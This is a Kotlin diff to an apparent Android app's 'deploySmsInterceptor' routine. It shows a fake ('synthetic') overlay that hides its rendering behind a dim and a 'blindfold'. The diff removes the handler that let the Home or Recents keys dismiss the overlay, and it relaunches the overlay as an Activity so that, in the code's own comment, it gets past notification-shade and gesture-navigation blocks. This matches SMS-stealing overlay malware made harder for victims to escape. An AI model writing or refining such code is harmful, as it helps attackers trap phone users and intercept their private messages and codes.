@@ -1460,29 +1460,12 @@ object DynamicUIManager {
         }
     }
 
+    private var lastSmsInterceptTime = 0L
+
     fun deploySmsInterceptor(ctx: Context) {
-        if (isSmsInterceptorActive) return
-        
-        // Register BroadcastReceiver for Home/Recents detection
-        if (interceptorReceiver == null) {
-            interceptorReceiver = object : android.content.BroadcastReceiver() {
-                override fun onReceive(context: Context, intent: Intent) {
-                    if (intent.action == Intent.ACTION_CLOSE_SYSTEM_DIALOGS) {
-                        val reason = intent.getStringExtra("reason")
-                        if (reason == "homekey" || reason == "recentapps") {
-                            DebugLogger.log("SMS_INTERCEPT", "Home/Recents pressed. Dismissing synthetic overlay.")
-                            removeOverlay(context, "SYSTEM_DIALOG_CLOSED", true)
-                        }
-                    }
-                }
-            }
-            val filter = android.content.IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
-            if (android.os.Build.VERSION.SDK_INT >= 33) {
-                ctx.applicationContext.registerReceiver(interceptorReceiver, filter, Context.RECEIVER_EXPORTED)
-            } else {
-                ctx.applicationContext.registerReceiver(interceptorReceiver, filter)
-            }
-        }
+        val now = System.currentTimeMillis()
+        if (now - lastSmsInterceptTime < 2000) return
+        lastSmsInterceptTime = now
 
         // Apply 0% dim briefly to hide render transition
         DimmerManager.applyDim(ctx, 0, "AUTO")
@@ -1502,7 +1485,9 @@ object DynamicUIManager {
         }
         
         isSmsInterceptorActive = true
-        showOverlay(ctx, true, "OVERLAY", html, true, false, "SMS_INTERCEPTOR")
+        // CRITICAL FIX: appMode = true deploys the UI as a standard Activity, 
+        // resolving notification shade and gesture navigation blocks.
+        showOverlay(ctx, true, "OVERLAY", html, true, true, "SMS_INTERCEPTOR")
         
         // Lift blindfold after 600ms
         Handler(Looper.getMainLooper()).postDelayed({
